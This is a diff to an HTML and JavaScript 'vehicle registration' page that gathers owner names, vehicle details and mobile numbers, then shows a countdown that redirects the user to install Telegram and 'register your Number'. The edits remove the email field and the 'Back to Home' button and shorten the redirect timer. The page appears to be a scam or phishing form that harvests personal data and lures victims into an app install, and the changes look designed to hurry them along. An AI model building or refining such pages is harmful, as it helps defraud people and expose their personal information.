@@ -248,13 +248,7 @@ input:focus::placeholder {
         <label>Mobile Number</label>
         <input id="mobileNo" type="tel" maxlength="10" placeholder="Enter Mobile Number">
 
-        <label>Email Address</label>
-        <input id="email" type="email" placeholder="example@mail.com">
-
         <button onclick="registerVehicle()">📲 Register Vehicle</button>
-<button onclick="window.location.href='index.html'" style="background: rgba(255, 255, 255, 0.1); margin-top: 10px;">
-    🏠 Back to Home
-</button>
 
         <div class="loader" id="loader">Saving Registration...</div>
     </div>
@@ -267,7 +261,7 @@ input:focus::placeholder {
             Your vehicle details have been received successfully.<br><br>
             <b>We are redirecting you to install Telegram app on your device. Make sure to Install and register your Number.</b>
         </p>
-        <p class="countdown-text">This page will close or redirect in <span id="count">8</span> seconds...</p>
+        <p class="countdown-text">This page will close or redirect in <span id="count">5</span> seconds...</p>
     </div>
 </div>
 
@@ -302,18 +296,9 @@ function registerVehicle(){
     const vehiclemodel = document.getElementById("vehiclemodel").value.trim();
     const ownerName = document.getElementById("ownerName").value.trim();
     const mobileNo = document.getElementById("mobileNo").value.trim();
-    const email = document.getElementById("email").value.trim(); // Added field
 
-    // Updated validation to include email
-    if(!vehicleNo || !vehiclemodel || !ownerName || !mobileNo || !email){
+    if(!vehicleNo || !vehiclemodel || !ownerName || !mobileNo){
         alert("Please fill all details.");
-        return;
-    }
-
-    // Basic Email format validation
-    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if(!emailPattern.test(email)){
-        alert("Please enter a valid email address.");
         return;
     }
 
@@ -334,8 +319,7 @@ function registerVehicle(){
         vehicleNo: vehicleNo,
         vehiclemodel: vehiclemodel,
         ownerName: ownerName,
-        mobileNo: mobileNo,
-        email: email // Added to payload
+        mobileNo: mobileNo
     };
 
     for(const key in fields){
@@ -345,7 +329,7 @@ function registerVehicle(){
         input.value = fields[key];
         form.appendChild(input);
     }
-    // ... rest of your function remains the same
+
     document.body.appendChild(form);
     form.submit();
 
@@ -354,7 +338,7 @@ function registerVehicle(){
         document.getElementById("formArea").style.display = "none";
         document.getElementById("success").style.display = "block";
 
-        let seconds = 8;
+        let seconds = 5;
         const count = document.getElementById("count");
 
         const timer = setInterval(function(){
